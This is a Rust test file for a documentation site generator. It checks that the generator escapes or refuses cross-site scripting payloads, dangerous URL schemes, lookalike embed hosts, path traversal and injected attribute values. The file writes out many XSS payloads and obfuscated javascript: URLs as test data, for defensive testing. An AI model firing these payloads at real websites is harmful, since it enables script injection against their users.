//! Hand-written attacks on the HTML and URL policy.
//!
//! Two kinds of test live here. The first builds a library that puts hostile text in every place
//! where content may put text, then reads every file that was written with a small HTML scanner
//! and refuses anything that could run script: a tag outside a fixed list, an `on*` or `style`
//! attribute, a script with a body, a dangerous URL, a frame that is not a sandboxed video player.
//! The second feeds one refused payload at a time and requires an error and no output.
//!
//! The scanner is written for these tests: it follows the HTML tokenizer closely enough for the
//! output of this engine, which is machine-made and regular. It is not a general HTML parser.

use std::fs;

use walkdir::WalkDir;

use super::*;
use crate::tests::{Scratch, library};

/// Every tag that the engine and the folio theme are allowed to write.
const TAGS: &[&str] = &[
    "a",
    "abbr",
    "article",
    "aside",
    "b",
    "blockquote",
    "body",
    "br",
    "button",
    "circle",
    "g",
    "rect",
    "small",
    "code",
    "dd",
    "del",
    "details",
    "div",
    "dl",
    "dt",
    "em",
    "figcaption",
    "figure",
    "footer",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "head",
    "header",
    "hr",
    "html",
    "i",
    "iframe",
    "img",
    "input",
    "kbd",
    "label",
    "li",
    "link",
    "main",
    "meta",
    "nav",
    "ol",
    "p",
    "path",
    "pre",
    "s",
    "script",
    "section",
    "span",
    "strong",
    "sub",
    "summary",
    "sup",
    "svg",
    "table",
    "tbody",
    "td",
    "th",
    "thead",
    "title",
    "tr",
    "ul",
];

/// Attributes whose value is a URL.
const URL_ATTRIBUTES: &[&str] = &[
    "action",
    "background",
    "data",
    "formaction",
    "href",
    "ping",
    "poster",
    "src",
    "xlink:href",
];

/// Attributes that can carry code or styling and are never written.
const FORBIDDEN_ATTRIBUTES: &[&str] = &["formaction", "srcdoc", "style"];

const HOSTILE_SCRIPT: &str = "\"><script>alert(1)</script>";
const HOSTILE_IMG: &str = "\"><img src=x onerror=alert(1)>";
/// The same attack for Markdown text, where raw HTML is refused: every character is escaped.
const HOSTILE_MARKDOWN: &str = r#"\"\>\<script\>alert(1)\</script\>"#;
/// The same attack for directive attributes, which cannot hold a quote.
const HOSTILE_ATTRIBUTE: &str = "<script>alert(1)</script> <img src=x onerror=alert(1)>";

/// Decodes the entities that an attribute value can hold, the way a browser does before it reads
/// a URL: the named ones the engine writes and any numeric one.
fn decode(value: &str) -> String {
    let mut out = String::new();
    let mut rest = value;
    while let Some(at) = rest.find('&') {
        out.push_str(&rest[..at]);
        rest = &rest[at..];
        let Some(end) = rest.find(';') else {
            break;
        };
        let name = &rest[1..end];
        let decoded = match name {
            "amp" => Some('&'),
            "quot" => Some('"'),
            "lt" => Some('<'),
            "gt" => Some('>'),
            "apos" => Some('\''),
            _ => name
                .strip_prefix('#')
                .and_then(|n| match n.strip_prefix(['x', 'X']) {
                    Some(hex) => u32::from_str_radix(hex, 16).ok(),
                    None => n.parse().ok(),
                })
                .and_then(char::from_u32),
        };
        if let Some(c) = decoded {
            out.push(c);
            rest = &rest[end + 1..];
        } else {
            out.push('&');
            rest = &rest[1..];
        }
    }
    out.push_str(rest);
    out
}

/// What a browser would see as the start of a URL: entities decoded, white space and control
/// characters dropped, lower case.
fn url_start(value: &str) -> String {
    decode(value)
        .chars()
        .filter(|c| !c.is_control() && !c.is_whitespace())
        .collect::<String>()
        .to_lowercase()
}

fn dangerous_url(value: &str) -> bool {
    let url = url_start(value);
    ["javascript:", "vbscript:", "data:", "file:", "blob:"]
        .iter()
        .any(|scheme| url.starts_with(scheme))
}

/// Reads attributes from the text after a tag name. Returns them and the text after `>`, or `None`
/// when the tag never ends.
fn attributes(mut rest: &str) -> Option<(Vec<(String, String)>, &str)> {
    let mut found = Vec::new();
    loop {
        rest = rest.trim_start_matches(|c: char| c.is_whitespace() || c == '/');
        if let Some(after) = rest.strip_prefix('>') {
            return Some((found, after));
        }
        let name_end = rest.find(|c: char| c.is_whitespace() || matches!(c, '=' | '>' | '/'))?;
        if name_end == 0 {
            return None;
        }
        let name = rest[..name_end].to_ascii_lowercase();
        rest = rest[name_end..].trim_start();
        let mut value = String::new();
        if let Some(after) = rest.strip_prefix('=') {
            rest = after.trim_start();
            if let Some(quote) = rest.chars().next().filter(|c| matches!(c, '"' | '\'')) {
                let inner = &rest[1..];
                let end = inner.find(quote)?;
                value = inner[..end].to_owned();
                rest = &inner[end + 1..];
            } else {
                let end = rest.find(|c: char| c.is_whitespace() || c == '>')?;
                value = rest[..end].to_owned();
                rest = &rest[end..];
            }
        }
        found.push((name, value));
    }
}

fn attribute<'a>(attrs: &'a [(String, String)], name: &str) -> Option<&'a str> {
    attrs
        .iter()
        .find(|(n, _)| n == name)
        .map(|(_, v)| v.as_str())
}

fn check_tag(path: &str, name: &str, attrs: &[(String, String)], problems: &mut Vec<String>) {
    let mut bad = |why: String| problems.push(format!("{path}: <{name}> {why}"));
    for (key, value) in attrs {
        if key.starts_with("on") {
            bad(format!("has the event attribute `{key}`"));
        }
        if FORBIDDEN_ATTRIBUTES.contains(&key.as_str()) {
            bad(format!("has the attribute `{key}`"));
        }
        if URL_ATTRIBUTES.contains(&key.as_str()) && dangerous_url(value) {
            bad(format!("has a dangerous URL in `{key}`: {value}"));
        }
    }
    match name {
        "script" => {
            let ok =
                attribute(attrs, "src").is_some_and(|s| s.starts_with('/') && !s.starts_with("//"));
            if !ok {
                bad("is not a script of this site".to_owned());
            }
        }
        "link" => {
            let ok = attribute(attrs, "href").is_some_and(|h| {
                (h.starts_with('/') && !h.starts_with("//")) || h.starts_with("https://")
            });
            if !ok {
                bad("links something that is neither of this site nor https".to_owned());
            }
        }
        "meta" => {
            let refresh =
                attribute(attrs, "http-equiv").is_some_and(|v| v.eq_ignore_ascii_case("refresh"));
            if refresh {
                let content = attribute(attrs, "content").unwrap_or_default();
                let target = content.split_once("url=").map_or("", |(_, t)| t);
                if dangerous_url(target) {
                    bad(format!("refreshes to a dangerous URL: {content}"));
                }
            }
        }
        "iframe" => {
            let src = attribute(attrs, "src").unwrap_or_default();
            let player = src.starts_with("https://www.youtube-nocookie.com/embed/")
                || src.starts_with("https://player.vimeo.com/video/");
            if !player || attribute(attrs, "sandbox").is_none() {
                bad(format!("is not a sandboxed video player: {src}"));
            }
        }
        _ => {}
    }
}

/// Scans one HTML file. The result lists every problem found; an empty list means clean.
fn scan(path: &str, html: &str) -> Vec<String> {
    let mut problems = Vec::new();
    let mut rest = html;
    while let Some(at) = rest.find('<') {
        rest = &rest[at + 1..];
        if let Some(after) = rest.strip_prefix("!--") {
            problems.push(format!("{path}: an HTML comment"));
            match after.find("-->") {
                Some(end) => rest = &after[end + 3..],
                None => break,
            }
            continue;
        }
        if rest.starts_with('!') {
            match rest.find('>') {
                Some(end) => rest = &rest[end + 1..],
                None => break,
            }
            continue;
        }
        let closing = rest.starts_with('/');
        let body = rest.trim_start_matches('/');
        let name_len = body
            .find(|c: char| !c.is_ascii_alphanumeric())
            .unwrap_or(body.len());
        let name = body[..name_len].to_ascii_lowercase();
        if name.is_empty() {
            problems.push(format!("{path}: a `<` that does not start a tag"));
            continue;
        }
        if !TAGS.contains(&name.as_str()) {
            problems.push(format!("{path}: the tag <{name}> is not allowed"));
        }
        if closing {
            rest = body.find('>').map_or("", |end| &body[end + 1..]);
            continue;
        }
        let Some((attrs, after)) = attributes(&body[name_len..]) else {
            problems.push(format!("{path}: <{name}> never ends"));
            break;
        };
        check_tag(path, &name, &attrs, &mut problems);
        rest = after;
        if name == "script" {
            let end = rest.find("</script").unwrap_or(rest.len());
            if !rest[..end].trim().is_empty() {
                problems.push(format!("{path}: a script with a body"));
            }
            rest = &rest[end..];
        }
    }
    problems
}

fn has_extension(path: &str, extension: &str) -> bool {
    std::path::Path::new(path)
        .extension()
        .is_some_and(|e| e.eq_ignore_ascii_case(extension))
}

/// Every file under `dist`, as `(path with /, text)`.
fn written(s: &Scratch) -> Vec<(String, String)> {
    let dist = s.0.join("dist");
    let mut files = Vec::new();
    for entry in WalkDir::new(&dist).into_iter().filter_map(Result::ok) {
        if !entry.file_type().is_file() {
            continue;
        }
        let relative = entry
            .path()
            .strip_prefix(&dist)
            .unwrap()
            .to_string_lossy()
            .replace('\\', "/");
        if let Ok(text) = fs::read_to_string(entry.path()) {
            files.push((relative, text));
        }
    }
    files
}

#[test]
fn the_scanner_catches_what_it_is_meant_to_catch() {
    let bad = [
        "<script>alert(1)</script>",
        "<script src=\"https://evil.example/x.js\"></script>",
        "<a href=\"javascript:alert(1)\">x</a>",
        "<a href=\"&#106;avascript:alert(1)\">x</a>",
        "<a href=\"  JaVa\tScRiPt:alert(1)\">x</a>",
        "<a href=\"data:text/html,x\">x</a>",
        "<img src=x onerror=alert(1)>",
        "<p style=\"color:red\">x</p>",
        "<svg onload=alert(1)></svg>",
        "<style>p{}</style>",
        "<object data=x></object>",
        "<iframe src=\"https://evil.example/\"></iframe>",
        "<iframe src=\"https://player.vimeo.com/video/1\"></iframe>",
        "<meta http-equiv=\"refresh\" content=\"0; url=javascript:alert(1)\">",
        "<p>1 < 2</p>",
        "<!-- comment -->",
        "<p title=\"never ends>x</p>",
    ];
    for html in bad {
        assert_ne!(scan("t.html", html).len(), 0, "not caught: {html}");
    }
    let good = [
        "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>T</title></head>",
        "<script src=\"/assets/x.js\" defer></script>",
        "<a href=\"https://example.org/?a=1&amp;b=2\">x &lt;script&gt;</a>",
        "<iframe src=\"https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ\" sandbox=\"allow-scripts\"></iframe>",
        "<link rel=\"stylesheet\" href=\"/assets/x.css\">",
    ];
    for html in good {
        assert_eq!(
            scan("t.html", html),
            Vec::<String>::new(),
            "wrongly caught: {html}"
        );
    }
}

/// A library that puts hostile text in every place where content may put text.
fn hostile_library(s: &Scratch) {
    s.put(
        "anaquel.toml",
        &format!(
            "schema = 1\nengine = \"0.2\"\ntitle = \"Demo {}\"\nbase_url = \"https://docs.example\"\n",
            HOSTILE_SCRIPT.replace('"', "\\\"")
        ),
    );
    s.put(
        "volumes/guide/volume.toml",
        &format!(
            "title = \"Guide {}\"\ndescription = \"How {}\"\n",
            HOSTILE_SCRIPT.replace('"', "\\\""),
            HOSTILE_IMG.replace('"', "\\\"")
        ),
    );
    s.put(
        "volumes/guide/_index.md",
        "# Guide\n\nSee [setup](setup.md) and [blocks](blocks.md).\n",
    );
    s.put("volumes/guide/img/logo.txt", "logo");
    s.put("volumes/guide/setup.md", &setup_page());
    s.put("volumes/guide/blocks.md", &blocks_page());
}

/// The page that holds hostile text in front matter, headings, links, tables and code.
fn setup_page() -> String {
    let script = HOSTILE_SCRIPT.replace('"', "\\\"");
    let img = HOSTILE_IMG.replace('"', "\\\"");
    let md = HOSTILE_MARKDOWN;
    format!(
        r#"---
title: "Setup {script}"
description: "About {img}"
aliases:
  - "/old/setup"
---
# Setup

Text with &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E; and `<script>alert(1)</script>` inline.

## Heading `<img src=x onerror=alert(1)>` and "quotes" & more

[title](setup.md "t{md}") and [ext](https://example.org/a"onmouseover="alert(1)) and
[query](https://example.org/?a=1&b=2&c=<d>) and <https://example.org/x?a=1&b=2>
and [mail](mailto:someone%40example.org?subject=<b>x</b>).

[\<script\>alert(1)\</script\>](setup.md)

![alt {md}](img/logo.txt "t{md}")

| a {md} | b |
| --- | --- |
| `<script>` | &#60;script&#62; |

Note[^1].

[^1]: A note with &lt;script&gt;alert(1)&lt;/script&gt;.

```html
<script>alert(1)</script>
```

```x"onmouseover="alert(1)
<img src=x onerror=alert(1)>
```

```rust
let s = "<script>alert(1)</script>";
```
"#,
    )
}

/// The page that holds hostile text in every directive.
fn blocks_page() -> String {
    let attack = HOSTILE_ATTRIBUTE;
    format!(
        r#"# Blocks

:::hint danger
Danger &lt;script&gt;alert(1)&lt;/script&gt; and `<script>alert(1)</script>`.
:::

:::details title="Open {attack}" open
## Inside `<img src=x onerror=alert(1)>`
Body.
:::

::::tabs sync="group"
:::tab title="One {attack}"
Text.
:::
:::tab title="Two {attack}"
```html
<script>alert(1)</script>
```
:::
::::

::::cards cols=2
:::card title="Card {attack}" href="setup.md"
Text.
:::
:::card title="Out {attack}" href="https://example.org/?a=1&b=2"
Text.
:::
::::

:::::steps
::::step title="Step {attack}"
Text.
::::
:::::

::::columns
:::column width=3
Left.
:::
:::column
Right.
:::
::::

:::embed url="https://youtu.be/dQw4w9WgXcQ"
:::
"#,
    )
}

#[test]
fn hostile_text_in_every_accepted_place_writes_only_safe_html() {
    let s = Scratch::new("xss-everywhere");
    hostile_library(&s);
    let outcome = build(&s.options());
    assert_eq!(
        outcome
            .report
            .items()
            .iter()
            .map(|d| format!("{} {} {:?}:{:?}", d.code, d.message, d.path, d.line))
            .collect::<Vec<_>>(),
        Vec::<String>::new()
    );
    assert_ne!(outcome.pages, 0);

    let files = written(&s);
    let mut problems = Vec::new();
    let mut html_files = 0;
    for (path, text) in &files {
        if has_extension(path, "html") {
            html_files += 1;
            problems.extend(scan(path, text));
        } else if has_extension(path, "xml") || path == "_headers" || path == "_redirects" {
            for needle in ["<script", "onerror", "alert(1)</"] {
                if text.contains(needle) {
                    problems.push(format!("{path}: contains `{needle}`"));
                }
            }
        }
    }
    assert_eq!(problems, Vec::<String>::new());
    assert!(html_files >= 5, "only {html_files} pages were scanned");

    // The text must be there, escaped, or the test would prove nothing.
    let setup = s.read("guide/setup/index.html");
    for expected in [
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&lt;img src=x onerror=alert(1)&gt;",
        "&quot;&gt;&lt;script&gt;",
    ] {
        assert!(setup.contains(expected), "missing {expected}");
    }
    let blocks = s.read("guide/blocks/index.html");
    assert!(blocks.contains("&lt;script&gt;alert(1)&lt;/script&gt;"));
    assert!(blocks.contains("<iframe"));
    assert!(
        s.read("_headers")
            .contains("frame-src https://www.youtube-nocookie.com")
    );
    assert!(!blocks.contains("<script>alert"));
    assert!(!blocks.contains("<img src=x"));
}

/// Writes one page with the given source into the small library, then requires that `check` and
/// `build` both refuse it and that nothing is written.
fn refused(name: &str, source: &str) {
    let s = Scratch::new(&format!("xss-refused-{name}"));
    library(&s);
    s.put("volumes/guide/setup.md", source);
    let checked = check(&s.0);
    assert!(
        checked.report.has_errors(),
        "{name}: check accepted it:\n{source}"
    );
    assert!(
        checked
            .report
            .items()
            .iter()
            .any(|d| d.path.as_deref() == Some("volumes/guide/setup.md")),
        "{name}: refused, but not because of the page under test: {:?}",
        checked.report.items()
    );
    let built = build(&s.options());
    assert!(built.report.has_errors(), "{name}: build accepted it");
    assert!(built.written.is_none(), "{name}: build wrote files");
    assert!(!s.0.join("dist").exists(), "{name}: dist exists");
}

#[test]
fn links_with_a_script_scheme_are_refused() {
    let cases = [
        ("js", "[a](javascript:alert(1))"),
        ("js-case", "[a](JaVaScRiPt:alert(1))"),
        ("js-entity", "[a](&#106;avascript:alert(1))"),
        ("js-entity-hex", "[a](&#x6A;avascript:alert(1))"),
        ("js-tab", "[a](java&#x09;script:alert(1))"),
        ("js-newline", "[a](java&#x0A;script:alert(1))"),
        ("js-space", "[a](<javascript :alert(1)>)"),
        ("js-leading-space", "[a](< javascript:alert(1)>)"),
        ("js-autolink", "<javascript:alert(1)>"),
        ("js-reference", "[a][r]\n\n[r]: javascript:alert(1)\n"),
        ("js-image", "![x](javascript:alert(1))"),
        ("js-fragment", "[a](javascript:alert(1)#x)"),
        ("vbs", "[a](vbscript:msgbox(1))"),
        (
            "data",
            "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
        ),
        (
            "data-image",
            "![a](data:image/svg+xml,<svg onload=alert(1)>)",
        ),
        ("file", "[a](file:///etc/passwd)"),
        ("blob", "[a](blob:https://example.org/x)"),
        ("ftp", "[a](ftp://example.org/x)"),
        ("custom", "[a](x-evil:payload)"),
        ("protocol-relative", "[a](//evil.example/x)"),
        ("protocol-relative-image", "![a](//evil.example/x.png)"),
        ("absolute-path", "[a](/etc/passwd)"),
        ("backslash", "[a](\\\\evil.example\\x)"),
    ];
    for (name, body) in cases {
        refused(name, &format!("# Setup\n\n{body}\n"));
    }
}

#[test]
fn raw_html_in_any_form_is_refused() {
    let cases = [
        ("script", "<script>alert(1)</script>"),
        ("script-inline", "text <script>alert(1)</script> text"),
        (
            "script-src",
            "<script src=https://evil.example/x.js></script>",
        ),
        ("img", "<img src=x onerror=alert(1)>"),
        ("img-inline", "text <img src=x onerror=alert(1)> text"),
        ("anchor", "<a href=javascript:alert(1)>x</a>"),
        ("anchor-quoted", "<a href=\"javascript:alert(1)\">x</a>"),
        ("svg", "<svg onload=alert(1)>"),
        ("iframe", "<iframe src=\"https://evil.example/\"></iframe>"),
        ("style", "<style>body{display:none}</style>"),
        ("object", "<object data=x></object>"),
        ("embed", "<embed src=x>"),
        (
            "form",
            "<form action=https://evil.example/><input name=x></form>",
        ),
        ("base", "<base href=https://evil.example/>"),
        (
            "meta",
            "<meta http-equiv=refresh content=\"0;url=https://evil.example/\">",
        ),
        ("comment", "<!-- hidden -->"),
        ("cdata", "<![CDATA[x]]>"),
        ("processing", "<?php echo 1; ?>"),
        (
            "details",
            "<details open ontoggle=alert(1)><summary>x</summary></details>",
        ),
        ("div-block", "<div onmouseover=alert(1)>\nhover\n</div>"),
        ("uppercase", "<SCRIPT>alert(1)</SCRIPT>"),
        ("split", "<scr\nipt>alert(1)</script>"),
    ];
    for (name, body) in cases {
        refused(name, &format!("# Setup\n\n{body}\n"));
    }
}

#[test]
fn raw_html_inside_a_directive_is_refused() {
    let cases = [
        ("hint", ":::hint\n<script>alert(1)</script>\n:::"),
        (
            "details",
            ":::details title=\"x\"\n<img src=x onerror=alert(1)>\n:::",
        ),
        (
            "tabs",
            "::::tabs\n:::tab title=\"x\"\n<script>alert(1)</script>\n:::\n::::",
        ),
        (
            "cards",
            "::::cards\n:::card title=\"x\"\n<iframe src=x></iframe>\n:::\n::::",
        ),
    ];
    for (name, body) in cases {
        refused(&format!("block-{name}"), &format!("# Setup\n\n{body}\n"));
    }
}

#[test]
fn directive_attributes_cannot_carry_a_dangerous_url_or_unknown_names() {
    let cases = [
        ("embed-js", ":::embed url=\"javascript:alert(1)\"\n:::"),
        ("embed-data", ":::embed url=\"data:text/html,x\"\n:::"),
        (
            "embed-http",
            ":::embed url=\"http://www.youtube.com/embed/dQw4w9WgXcQ\"\n:::",
        ),
        (
            "embed-other-host",
            ":::embed url=\"https://evil.example/embed/dQw4w9WgXcQ\"\n:::",
        ),
        (
            "embed-lookalike",
            ":::embed url=\"https://www.youtube.com.evil.example/embed/dQw4w9WgXcQ\"\n:::",
        ),
        (
            "embed-userinfo",
            ":::embed url=\"https://www.youtube.com\u{40}evil.example/embed/dQw4w9WgXcQ\"\n:::",
        ),
        (
            "embed-id-injection",
            ":::embed url=\"https://www.youtube.com/embed/x\\\"onload=alert(1)\"\n:::",
        ),
        ("embed-no-url", ":::embed\n:::"),
        (
            "embed-body",
            ":::embed url=\"https://youtu.be/dQw4w9WgXcQ\"\ntext\n:::",
        ),
        (
            "card-js",
            "::::cards\n:::card title=\"x\" href=\"javascript:alert(1)\"\n:::\n::::",
        ),
        (
            "card-data",
            "::::cards\n:::card title=\"x\" href=\"data:text/html,x\"\n:::\n::::",
        ),
        (
            "card-image-js",
            "::::cards\n:::card title=\"x\" image=\"javascript:alert(1)\"\n:::\n::::",
        ),
        ("unknown-name", ":::script\nalert(1)\n:::"),
        ("unknown-attribute", ":::hint onclick=alert(1)\nx\n:::"),
        ("unknown-flag", ":::hint onmouseover\nx\n:::"),
        ("style-attribute", ":::hint style=\"display:none\"\nx\n:::"),
        ("class-attribute", ":::hint class=\"x\"\nx\n:::"),
        ("unclosed", ":::hint\nx"),
        ("misplaced-tab", ":::tab title=\"x\"\nx\n:::"),
    ];
    for (name, body) in cases {
        refused(name, &format!("# Setup\n\n{body}\n"));
    }
}

#[test]
fn front_matter_cannot_smuggle_a_path_or_an_address() {
    let cases = [
        ("slug-quote", "---\nslug: 'a\"b'\n---\n# Setup\n"),
        ("slug-angle", "---\nslug: '<script>'\n---\n# Setup\n"),
        ("slug-slash", "---\nslug: '../x'\n---\n# Setup\n"),
        (
            "slug-scheme",
            "---\nslug: 'javascript:alert(1)'\n---\n# Setup\n",
        ),
        (
            "alias-relative",
            "---\naliases:\n  - 'javascript:alert(1)'\n---\n# Setup\n",
        ),
        (
            "alias-protocol-relative",
            "---\naliases:\n  - '//evil.example/x'\n---\n# Setup\n",
        ),
        ("alias-space", "---\naliases:\n  - '/a b'\n---\n# Setup\n"),
        (
            "alias-dotdot",
            "---\naliases:\n  - '/a/../b'\n---\n# Setup\n",
        ),
        ("alias-query", "---\naliases:\n  - '/a?x=1'\n---\n# Setup\n"),
        (
            "alias-newline",
            "---\naliases:\n  - \"/a\\n/b\"\n---\n# Setup\n",
        ),
        ("unknown-key", "---\non_load: alert(1)\n---\n# Setup\n"),
    ];
    for (name, source) in cases {
        refused(&format!("fm-{name}"), source);
    }
}

#[test]
fn page_and_folder_names_that_would_change_an_address_are_refused() {
    let paths = [
        "my page.md",
        "a&b.md",
        "c#.md",
        "100%.md",
        "it's.md",
        "a;b.md",
        "a,b.md",
        "(x).md",
        "x/y z/page.md",
        "sub dir/_index.md",
    ];
    for (i, path) in paths.iter().enumerate() {
        let s = Scratch::new(&format!("xss-name-{i}"));
        library(&s);
        s.put(&format!("volumes/guide/{path}"), "# T\n");
        let built = build(&s.options());
        assert!(built.report.has_errors(), "{path} was accepted");
        assert!(built.written.is_none(), "{path}: files were written");
        assert!(!s.0.join("dist").exists(), "{path}: dist exists");
    }
}

#[test]
fn a_slug_can_stand_in_for_a_name_that_is_not_an_address() {
    let s = Scratch::new("xss-name-slug");
    library(&s);
    s.put("volumes/guide/my page.md", "---\nslug: my-page\n---\n# T\n");
    let built = build(&s.options());
    assert_eq!(
        built
            .report
            .items()
            .iter()
            .map(|d| d.message.clone())
            .collect::<Vec<_>>(),
        Vec::<String>::new()
    );
    assert!(s.exists("guide/my-page/index.html"));
}

#[test]
fn a_static_file_whose_name_would_end_its_address_is_refused() {
    for (i, path) in ["img/c#.txt", "img/100%.txt", "d%23/x.txt"]
        .iter()
        .enumerate()
    {
        let s = Scratch::new(&format!("xss-static-{i}"));
        library(&s);
        s.put(&format!("volumes/guide/{path}"), "x");
        let built = build(&s.options());
        assert!(built.report.has_errors(), "{path} was accepted");
        assert!(built.written.is_none());
    }
}
